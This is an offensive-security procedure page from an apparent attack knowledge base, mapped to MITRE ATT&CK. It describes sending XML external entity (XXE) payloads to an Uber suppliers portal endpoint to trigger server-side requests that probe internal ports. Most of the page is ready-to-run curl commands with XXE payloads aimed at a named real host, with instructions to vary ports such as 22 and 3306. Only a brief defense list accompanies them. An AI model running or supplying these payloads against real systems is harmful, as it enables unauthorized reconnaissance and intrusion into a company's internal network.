---
id: proc-send-xxe-payloads-uber
tags:
  - ssrf
  - xxe
  - oob
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-post-xxe-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:10.108Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send-XXE-Payloads-to-POST-Endpoint

## Summary

This procedure involves sending crafted XXE payloads to a vulnerable POST endpoint on usuppliers.uber.com to trigger out-of-band SSRF requests, allowing the server to probe internal resources.

## Description

In the context of the Uber suppliers portal, the application processes XML inputs without proper entity expansion controls, enabling attackers to craft XXE payloads that force the server to make external or internal requests. By targeting internal ports via OOB techniques (e.g., DNS or HTTP to localhost:port), attackers can observe server behavior. Prerequisites include public access to the endpoint and knowledge of common internal ports to test (e.g., 80, 443, 22, 3306). Expected outcomes are varied server responses that leak information about internal connectivity.

## Requirements

1. Public internet access to https://usuppliers.uber.com
2. curl or similar HTTP client for POST requests
3. List of target internal ports (e.g., 80, 22)

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in XML parsers (e.g., libxml2 with XXE disabled)
- Implement uniform error handling to avoid leaky messages
- Monitor for anomalous outbound requests from the application server to internal IPs/ports

## Objectives

1. Trigger SSRF via XXE to initiate internal probes
2. Collect server responses for analysis
3. Identify potential internal service exposure

## Instructions

### Step 1: Prepare XXE Payload

**Context**: Craft an XML payload that uses external entities to attempt OOB requests to an internal host and port.

**Command** ([[commands/curl-post-xxe-payload]]):
```bash
curl -X POST https://usuppliers.uber.com/upload-endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://127.0.0.1:80/">%xxe;]><root/>'
```

> This command sends a basic XXE payload targeting localhost port 80. The server will attempt to fetch from the internal URL if vulnerable, resulting in an error or success indicator in the response.

### Step 2: Vary Payloads for Different Ports

**Context**: Repeat the request with modified ports to cover a range of potential internal services.

**Command** ([[commands/curl-post-xxe-payload]]):
```bash
curl -X POST https://usuppliers.uber.com/upload-endpoint \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://127.0.0.1:22/">%xxe;]><root/>' > response-22.txt
```

> Save responses to files for later comparison. Adjust the port in the entity URL (e.g., 22 for SSH, 3306 for MySQL).

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-post-xxe-payload]]

## Tools Used

- [[tools/curl]]

## Tags

- ssrf
- xxe
- oob
